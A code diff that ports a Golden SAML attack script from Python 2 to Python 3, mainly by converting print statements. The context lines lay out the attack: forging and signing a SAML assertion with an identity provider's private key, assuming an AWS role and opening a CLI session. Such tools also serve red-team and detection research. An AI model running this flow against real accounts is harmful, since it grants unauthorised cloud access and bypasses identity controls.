@@ -1,4 +1,5 @@
-# coding: utf-8
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 '''
 Main module to perform a Golden SAML attack.
 
@@ -9,6 +10,7 @@ Execution flow:
     - Use the SAMLResponse to open a session with the SP
     - Apply the session for the user to use
 '''
+from __future__ import print_function
 
 # Imports
 import argparse
@@ -156,7 +158,7 @@ def main():
 
     # Check if the user provided file to load from
     if args.load_file:
-        print "[+] Loading SAMLResponse from file..."
+        print("[+] Loading SAMLResponse from file...")
         saved_response = open(args.load_file, "r").read()
         arn, role_name = AWS.load(saved_response)
         aws_session_token = AWS.assume_role(
@@ -174,7 +176,7 @@ def main():
     session_expiration = AWS.gen_timestamp(base_time=args.time, minutes=int(args.session_validity))
 
     # Create the assertion
-    print "[+] Creating the assertion"
+    print("[+] Creating the assertion")
     root = AWS.create_assertion(
         time,
         args.idp,
@@ -187,7 +189,7 @@ def main():
         args.arn)
 
     # Sign the assertion
-    print "[+] Signing the assertion with the private key provided"
+    print("[+] Signing the assertion with the private key provided")
     signed_root = AWS.sign_assertion(root, args.key, args.cert)
 
     # Insert signed assertion to saml response
@@ -203,21 +205,21 @@ def main():
 
     # Check if the user provided file to export to
     if args.out_file:
-        print "[+] Writing the SAMLResponse to file: %s" % args.out_file
+        print("[+] Writing the SAMLResponse to file: %s" % args.out_file)
         with open(args.out_file, "w") as out_file:
             out_file.write(encoded_response)        
         # Exit
         return
 
     # Assume role and get session token
-    print "[+] Calling AssumeRoleWithSAML API"
+    print("[+] Calling AssumeRoleWithSAML API")
     aws_session_token = AWS.assume_role(
         AWS.TEMPLATES['role_arn'].format(arn=args.arn, role=args.roles[0]),
         AWS.TEMPLATES['principal_arn'].format(arn=args.arn),
         encoded_response)
 
     # Open shell with the session
-    print "[+] Opening a shell"
+    print("[+] Opening a shell")
     AWS.apply_cli_session(aws_session_token["Credentials"], args.region)
 
 if __name__ == "__main__":
